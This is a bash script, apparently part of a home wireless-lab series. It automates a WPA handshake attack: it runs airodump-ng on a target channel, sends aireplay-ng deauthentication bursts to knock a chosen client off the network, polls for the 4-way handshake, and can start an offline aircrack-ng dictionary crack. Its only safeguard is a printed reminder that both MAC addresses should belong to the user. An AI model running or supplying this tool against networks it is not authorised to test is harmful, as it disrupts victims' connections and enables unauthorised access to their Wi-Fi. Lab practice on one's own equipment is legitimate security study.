#!/usr/bin/env bash
# All-in-one WPA handshake capture:
#   - locks the radio to the target channel
#   - starts airodump-ng in the background, writing to <prefix>-01.cap
#   - fires a deauth burst at the target client
#   - polls the capture file for a 4-way handshake
#   - re-fires deauth once at 30s if nothing captured yet
#   - exits when a handshake is found, or after 60s
#
# If -w <wordlist> is given, runs aircrack-ng against the capture once the
# handshake is in.
#
# Usage:
#   sudo ./08-handshake-capture.sh \
#       -a <bssid> -c <client> -i <iface> -k <channel> \
#       [-o <prefix>] [-w <wordlist>]

set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/lib/common.sh"

require_root

usage() {
    die "Usage: $0 -a <bssid> -c <client> -i <iface> -k <channel> [-o <prefix>] [-w <wordlist>]"
}

BSSID="" CLIENT="" IFACE="" CHANNEL="" OUTPUT="handshake" WORDLIST=""
while getopts "a:c:i:k:o:w:" opt; do
    case "$opt" in
        a) BSSID=$OPTARG ;;
        c) CLIENT=$OPTARG ;;
        i) IFACE=$OPTARG ;;
        k) CHANNEL=$OPTARG ;;
        o) OUTPUT=$OPTARG ;;
        w) WORDLIST=$OPTARG ;;
        *) usage ;;
    esac
done

[[ -z "$BSSID" || -z "$CLIENT" || -z "$IFACE" || -z "$CHANNEL" ]] && usage

warn "Handshake capture:"
warn "  AP BSSID  = $BSSID"
warn "  Client    = $CLIENT"
warn "  Channel   = $CHANNEL"
warn "  Iface     = $IFACE"
warn "  Output    = ${OUTPUT}-01.cap"
warn "Confirm BOTH MACs are listed in lab-notes/inventory.md as YOURS."
sleep 3

# Wipe any prior capture with this prefix so old packets don't confuse us.
rm -f "${OUTPUT}-"*

info "Starting airodump-ng in background..."
airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "$OUTPUT" "$IFACE" \
    >"/tmp/airodump-${OUTPUT}.log" 2>&1 &
AIRODUMP_PID=$!
trap 'kill $AIRODUMP_PID 2>/dev/null || true; wait $AIRODUMP_PID 2>/dev/null || true' EXIT

# Let airodump lock the channel and create the capture file.
sleep 3

info "Sending deauth burst at $CLIENT..."
aireplay-ng --deauth 10 -a "$BSSID" -c "$CLIENT" "$IFACE" || true

info "Watching for handshake (up to 60s)..."
CAPFILE="${OUTPUT}-01.cap"
for i in $(seq 1 60); do
    if [[ -r "$CAPFILE" ]] && \
       aircrack-ng -b "$BSSID" "$CAPFILE" </dev/null 2>&1 \
       | grep -q "1 handshake"; then
        info "Handshake captured in $CAPFILE"
        kill "$AIRODUMP_PID" 2>/dev/null || true
        wait "$AIRODUMP_PID" 2>/dev/null || true
        trap - EXIT
        if [[ -n "$WORDLIST" ]]; then
            [[ -r "$WORDLIST" ]] || die "Wordlist not readable: $WORDLIST"
            info "Running offline crack with $WORDLIST..."
            exec aircrack-ng -w "$WORDLIST" -b "$BSSID" "$CAPFILE"
        fi
        info "Crack later with:"
        info "  sudo ./scripts/05-crack-handshake.sh -b $BSSID -w <wordlist> $CAPFILE"
        exit 0
    fi
    if (( i == 30 )); then
        warn "No handshake after 30s — sending another deauth burst."
        aireplay-ng --deauth 10 -a "$BSSID" -c "$CLIENT" "$IFACE" || true
    fi
    sleep 1
done

die "No handshake after 60s. Move closer to AP/client and re-run."
